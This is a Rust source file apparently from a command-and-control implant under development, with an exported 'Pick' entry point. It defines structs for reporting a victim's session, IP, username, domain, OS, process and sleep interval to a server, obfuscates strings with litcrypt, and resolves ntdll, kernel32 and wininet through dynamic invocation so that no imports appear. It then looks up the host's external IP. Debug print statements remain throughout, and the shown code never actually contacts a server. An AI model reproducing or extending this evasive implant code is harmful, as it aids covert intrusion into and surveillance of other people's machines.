#![allow(non_snake_case)]
#![allow(unused_variables)]

use serde::{Deserialize, Serialize};
use crate::func;
use std::os::windows::ffi::OsStrExt;

    // Define the UNICODE_STRING structure
    #[repr(C)]
    struct UNICODE_STRING {
        Length: u16,
        MaximumLength: u16,
        Buffer: *mut u16,
    }

//this is the struct that we will use to send our info to the server
#[derive(Serialize, Deserialize, Debug)]
pub struct ImpInfo {
    pub session: String,
    pub ip: String,
    pub username: String,
    pub domain: String,
    pub os: String,
    pub imp_pid: String,
    pub process_name: String,
    pub sleep: String,
}
//this is the struct that we will use to send our output to the server
#[derive(Serialize, Deserialize, Debug)]
struct OutputData {
    session: String,
    task_name: String,
    output: String,
}
#[derive(Serialize, Deserialize, Debug)]
pub struct SleepTime {
    sleep: String,
}

use_litcrypt!();

#[no_mangle]
pub extern "system" fn Pick() {
    //test litcrypt
    //this is for debugging
    println!("litcrypt testing: {}", lc!("litcrypt success"));

    // Dynamically obtain ntdll.dll's base address. 
    let ntdll = dinvoke_rs::dinvoke::get_module_base_address("ntdll.dll");

    //print the base address
    println!("ntdll base address: {:x}", ntdll);

    //Dynamically obtain kernel32.dll's base address
    let kernel32 = dinvoke_rs::dinvoke::get_module_base_address("kernel32.dll");

    println!("kernel32 base address: {:x}", kernel32);

    // Load wininet.dll using LdrGetDllHandle
    let dll_name = "wininet.dll\0";
    let dll_name_wide: Vec<u16> = std::ffi::OsStr::new(dll_name)
        .encode_wide()
        .collect();
    
    let _unicode_string = UNICODE_STRING {
        Length: ((dll_name.len() - 1) * 2) as u16, // subtract 1 for null terminator
        MaximumLength: (dll_name.len() * 2) as u16,
        Buffer: dll_name_wide.as_ptr() as *mut u16,
    };

    let handle: *mut std::ffi::c_void = std::ptr::null_mut();
    //let _handle_ptr: *mut *mut std::ffi::c_void = &mut handle;

    let ret: Option<*mut std::ffi::c_void>;
    let func_ptr: unsafe extern "system" fn(
        *const i8
    ) -> *mut std::ffi::c_void;

    unsafe {
        dinvoke_rs::dinvoke::dynamic_invoke!(
            kernel32,
            "LoadLibraryA",
            func_ptr,
            ret,
            "wininet\0".as_ptr() as *const i8
        );
    }

    let wininet = match ret {
        Some(handle) => handle as usize,
        None => {
            println!("[x] Dynamic invoke failed");
            0
        }
    };

    println!("wininet base address: {:x}", wininet);

    if ntdll != 0 
    {

        //test our functions
        let ip = func::get_external_ip(wininet);
        println!("IP: {}", ip);

    }   
    else 
    {
        println!("[x] Failed to get ntdll base address");
    }

}
